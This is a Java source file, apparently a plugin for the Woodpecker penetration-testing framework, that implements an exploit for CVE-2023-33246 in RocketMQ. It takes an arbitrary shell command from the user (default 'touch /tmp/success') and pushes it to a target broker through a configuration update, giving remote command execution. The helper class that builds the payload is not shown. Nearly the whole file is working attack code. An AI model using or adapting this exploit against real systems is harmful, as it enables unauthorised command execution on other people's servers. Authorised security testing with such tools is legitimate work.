package me.gv7.woodpecker.vuldb;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class CVE_2023_33246_PayloadGenerator implements IExploit {



    @Override
    public String getExploitTabCaption() {
        return "CVE-2023-33246";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        List<IArg> args = new ArrayList<>();
        final IArg command = RocketMqInfo.pluginHelper.createArg();

        command.setName("command");
        command.setDefaultValue("touch /tmp/success");
        command.setDescription("想执行的命令，暂时无回显");
        command.setRequired(true);
        command.setType(0);

        args.add(command);
        IArgsUsageBinder argsUsageBinder = RocketMqInfo.pluginHelper.createArgsUsageBinder();
        argsUsageBinder.setArgsList(args);

        return argsUsageBinder;
    }

    @Override
    public void doExploit(ITarget iTarget, Map<String, Object> customArgs, IResultOutput iResultOutput) throws Throwable {
        String  command = (String) customArgs.get("command");
        String  address =  iTarget.getAddress();

        CVE_2023_33246_Utils.updateConfig(address, CVE_2023_33246_Utils.getCmd(command));
        iResultOutput.infoPrintln(CVE_2023_33246_Utils.rocketmqHome);
        iResultOutput.infoPrintln(CVE_2023_33246_Utils.filterServerNums);
    }

}
